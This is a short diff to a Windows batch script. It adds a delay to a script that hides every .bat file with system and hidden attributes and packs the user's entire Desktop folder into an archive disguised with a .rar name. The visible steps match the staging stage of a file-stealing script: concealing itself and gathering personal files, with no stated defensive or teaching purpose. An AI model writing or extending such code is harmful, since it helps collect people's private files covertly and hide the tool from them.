@@ -1,5 +1,6 @@
 @echo off
 chcp 65001
+timeout /t 3 /nobreak
 cls
 attrib +s +h *.bat
 tar.exe -cvf desk.rar "%UserProfile%\Desktop"
